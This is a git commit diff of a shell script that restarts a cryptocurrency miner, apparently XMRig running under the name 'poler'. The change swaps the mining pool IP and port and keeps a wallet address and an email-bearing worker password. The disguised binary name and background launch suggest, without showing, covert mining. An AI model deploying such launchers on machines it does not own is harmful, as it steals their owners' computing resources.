ffa6c211c3c4a10dab6871c33d45ed985c2af254
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-07-31 06:22:55 -0400

    Update zaloop.sh

--- zaloop.sh
+++ zaloop.sh
@@ -1,4 +1,4 @@
 pkill poler
 sleep 10
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 91 --cpu-priority 5 -o 109.234.34.135:5999 -u 42fRBtHhowsGwhe6VdpoUu8ZvLYzaw4ou8AjAaSR6XpkbpUMgjeQXsXKmAjRU7hAXATcMi44pdPANinV7jYNNkRV1n9zJoD --pass=ro2miner:ivanovandrey1984g@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 91 --cpu-priority 5 -o 109.234.36.32:6010 -u 42fRBtHhowsGwhe6VdpoUu8ZvLYzaw4ou8AjAaSR6XpkbpUMgjeQXsXKmAjRU7hAXATcMi44pdPANinV7jYNNkRV1n9zJoD --pass=ro2miner:ivanovandrey1984g@gmail.com -k
 
